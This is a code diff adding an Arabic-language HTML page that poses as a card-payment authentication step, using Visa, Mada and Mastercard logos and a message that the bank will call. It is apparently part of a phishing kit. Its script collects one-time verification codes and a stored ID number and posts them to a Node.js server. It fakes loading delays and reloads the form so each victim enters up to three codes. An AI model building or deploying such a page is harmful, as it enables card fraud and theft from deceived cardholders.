@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>مصادقة الشراء</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+        }
+
+        .overlay, .otp-section {
+            max-width: 340px;
+            margin: 50px auto;
+            background: white;
+            border-radius: 20px;
+            padding: 30px 20px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        .overlay img,
+        .otp-section img {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        .overlay h2,
+        .otp-section h2 {
+            font-size: 20px;
+            color: #0078d7;
+            margin-bottom: 10px;
+        }
+
+        .overlay p,
+        .otp-section p {
+            font-size: 15px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .wait-button {
+            margin-top: 30px;
+            padding: 15px;
+            font-size: 16px;
+            background-color: #0078d7;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            width: 90%;
+            cursor: not-allowed;
+        }
+
+        .otp-section {
+            display: none;
+            text-align: center;
+        }
+
+        .otp-section h3 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .otp-section input {
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .otp-section button {
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            background-color: #6c757d;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .brands {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .brands img {
+            height: 24px;
+        }
+
+        .note {
+            color: #999;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        #otp {
+            width: 310px;
+        }
+
+        .logo {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 10px;
+            opacity: 0;
+            transition: opacity 1s ease;
+        }
+
+        .logo.show {
+            opacity: 1;
+        }
+
+        .logo img {
+            max-height: 150px;
+            width: 150px;
+        }
+
+        #loadingOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 20px;
+        }
+
+        .otp-section {
+            position: relative;
+        }
+
+        .spinner {
+            margin-bottom: 15px;
+            width: 50px;
+            height: 50px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #0078d7;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg);}
+            100% { transform: rotate(360deg);}
+        }
+    </style>
+</head>
+<body>
+
+    <div class="logo" id="logo">
+        <img src="https://akhbarna.net/assets/2022-04-10/images/151119_1_1649582947.jpg" alt="Care Logo" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa" />
+    </div>
+
+    <div class="overlay" id="overlay">
+        <img src="mobile.png" alt="loading" />
+        <h2>مصادقة الشراء</h2>
+        <p>يرجى الانتظار، العملية قيد التنفيذ...</p>
+        <p>لا تغادر أو تغلق الصفحة حتى انتهاء عملية الدفع.</p>
+        <p>سيتم الاتصال بك من قبل المصرف الخاص بحسابك.</p>
+        <p>بعدها سيتم إرسال رمز التحقق إلى رقم جوالك.</p>
+        <button class="wait-button" disabled>يرجى الانتظار...</button>
+    </div>
+
+    <div class="otp-section" id="otpSection">
+        <h2>إثبات ملكية البطاقة</h2>
+        <p id="otpText"></p>
+        <label for="otp"><strong>رمز التحقق *</strong></label>
+        <input type="tel" id="otp" placeholder="يرجى ادخال رمز التحقق" maxlength="6" minlength="4" />
+        <p class="note">سيتم إرسال رسالة كود التحقق في خلال <span id="otpTimer">03:00</span> دقيقة</p>
+        <button id="confirmOtpBtn">تأكيد</button>
+        <div class="brands">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Mada_Logo.svg" alt="mada" />
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard" />
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa" />
+        </div>
+    </div>
+
+    <div id="loadingOverlay" style="display:none;">
+        <div class="spinner"></div>
+        <h2 style="font-weight: bold; margin: 10px 0; color: #0078d7;">يرجى الانتظار</h2>
+        <p style="color: #333;">الرجاء عدم إغلاق الصفحة أو إعادة تحميل الصفحة</p>
+    </div>
+
+<script>
+    const OTP_MAX_ATTEMPTS = 3;
+    const LOADING_DURATION = 30000; // 30 ثانية
+
+    document.getElementById("confirmOtpBtn").addEventListener("click", async () => {
+        const otpInput = document.getElementById('otp');
+        const otpValue = otpInput.value.trim();
+
+        if (otpValue === '') {
+            alert('يرجى إدخال رمز التحقق قبل المتابعة.');
+            otpInput.focus();
+            return;
+        }
+
+        const idNumber = localStorage.getItem('id_number');
+        if (!idNumber) {
+            alert('خطأ: لم يتم العثور على رقم الهوية. الرجاء العودة للصفحة الرئيسية.');
+            return;
+        }
+
+        document.getElementById('loadingOverlay').style.display = 'flex'; // إظهار شاشة التحميل
+
+        let otpAttempts = parseInt(localStorage.getItem('otp_attempts_count') || '0');
+
+        try {
+            // 1. إعداد البيانات ككائن JavaScript
+            const requestData = {
+                action: 'save_otp',
+                id_number: idNumber,
+                otp_code: otpValue,
+                attempt_number: otpAttempts + 1
+            };
+
+            // 2. استخدام fetch API مع المسار الجديد والـ headers الصحيحة والـ body كـ JSON
+            const response = await fetch('http://localhost:3000/process_form_data', { // المسار الجديد لـ Node.js
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json' // هذا مهم جداً لإخبار Node.js أن البيانات JSON
+                },
+                body: JSON.stringify(requestData) // تحويل الكائن إلى سلسلة JSON
+            });
+
+            const result = await response.json();
+            console.log('Response from Node.js (OTP save):', result);
+
+            // تأخير متعمد لمحاكاة معالجة الخادم أو الانتظار
+            await new Promise(resolve => setTimeout(resolve, LOADING_DURATION));
+
+            if (result.status === 'success') {
+                otpAttempts++;
+                localStorage.setItem('otp_attempts_count', otpAttempts);
+
+                if (otpAttempts < OTP_MAX_ATTEMPTS) {
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    // إعادة تحميل الصفحة للسماح للمستخدم بإدخال OTP مرة أخرى
+                    // وهذا سيؤدي إلى إعادة تشغيل المؤقت وإعدادات OTP
+                    window.location.reload();
+                } else {
+                    // تجاوز الحد الأقصى للمحاولات
+                    localStorage.removeItem('otp_attempts_count'); // مسح العداد
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    window.location.href = "total2.html"; // إعادة التوجيه لصفحة أخرى
+                }
+            } else {
+                alert('فشل في إرسال رمز التحقق: ' + (result.message || 'خطأ غير معروف.'));
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        } catch (error) {
+            alert('خطأ في الاتصال بالخادم عند إرسال رمز التحقق.');
+            console.error('Fetch error during OTP submission:', error);
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+    });
+
+    // هذا الجزء من الكود يتعلق بالواجهة الأمامية والمؤقت، لا يحتاج إلى تعديل كبير
+    window.addEventListener('DOMContentLoaded', () => {
+        const overlay = document.getElementById('overlay');
+        const otpSection = document.getElementById('otpSection');
+        const otpText = document.getElementById('otpText');
+        const otpTimer = document.getElementById('otpTimer');
+        const otpInput = document.getElementById('otp');
+
+        const isFirstLoad = localStorage.getItem('otp_first_load');
+
+        if (isFirstLoad === null) {
+            localStorage.setItem('otp_first_load', 'false');
+            overlay.style.display = 'block';
+            otpSection.style.display = 'none';
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                otpSection.style.display = 'block';
+            }, 5000); // 5 ثواني
+        } else {
+            overlay.style.display = 'none';
+            otpSection.style.display = 'block';
+        }
+
+        const now = new Date();
+        const optionsDate = { year: 'numeric', month: '2-digit', day: '2-digit' };
+        const formattedDate = now.toLocaleDateString('ar-EG', optionsDate).replace(/\//g, '-');
+        const optionsTime = { hour: '2-digit', minute: '2-digit', hour12: false };
+        const formattedTime = now.toLocaleTimeString('ar-EG', optionsTime);
+
+        let currentAttempts = parseInt(localStorage.getItem('otp_attempts_count') || '0') + 1;
+        otpText.textContent = `تم ارسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP) الى رقمك المسجل لدينا لتأكيد حركة الدفع بتاريخ ${formattedDate} الساعة ${formattedTime}`;
+
+        otpInput.value = ''; // مسح قيمة حقل OTP عند تحميل الصفحة
+
+        let timeLeft = 180; // 3 دقائق (180 ثانية)
+
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+            const seconds = (timeLeft % 60).toString().padStart(2, '0');
+            otpTimer.textContent = `${minutes}:${seconds}`;
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                otpTimer.textContent = 'انتهى الوقت';
+            } else {
+                timeLeft--;
+            }
+        }
+
+        updateTimer(); // استدعاء الدالة فوراً لتجنب التأخير الأولي
+        const timerInterval = setInterval(updateTimer, 1000);
+    });
+
+    // تأثير إظهار الشعار (لوجو) بعد 15 ثانية
+    setTimeout(() => {
+        document.getElementById('logo').classList.add('show');
+    }, 15000);
+</script>
+</body>
+</html>
